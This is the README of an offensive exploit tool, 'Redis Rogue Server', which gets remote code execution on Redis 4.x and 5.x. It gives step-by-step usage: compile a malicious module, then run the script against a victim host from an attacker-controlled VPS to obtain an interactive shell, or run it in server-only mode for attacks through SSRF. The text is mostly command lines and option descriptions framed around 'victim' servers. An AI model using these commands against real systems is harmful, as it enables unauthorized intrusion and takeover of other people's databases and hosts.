# Redis Rogue Server

A exploit for Redis 4.x/Redis 5.x RCE, inspired by [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).

Also works for Redis 5.0.8.

## Usage:

Compile .so from <https://github.com/n0b0dyCN/RedisModules-ExecuteCommand>.

Copy the .so file to same folder with `redis-rogue-server.py`.

### Attack scenario 1 - redis unauthorized access/redis password known by attackers

Run the rogue server, which will connect to the victim redis server to launch an attack

```
python3 redis-rogue-server.py --rhost <target address> --rport <target port> --lhost <vps address> --lport <vps port>
```

Usage:

- `--rpasswd` if the victim redis service has authentication enabled, you can specify the password through this option
- `--rhost` IP of the victim redis service
- `--rport` port number of the victim redis service , default is 6379
- `--lhost` external IP address of your VPS
- `--lport` the port number of the rogue server, default is 21000

Run this command, and you will get an interactive shell!

### Attack scenario 2 - using SSRF to attack redis

You can use `--server-only` for SSRF cases.

```bash
python3 redis-rogue-server.py --server-only
```

Usage:

- `--server-only` only start the redis rogue server, do not actively connect to the victim redis server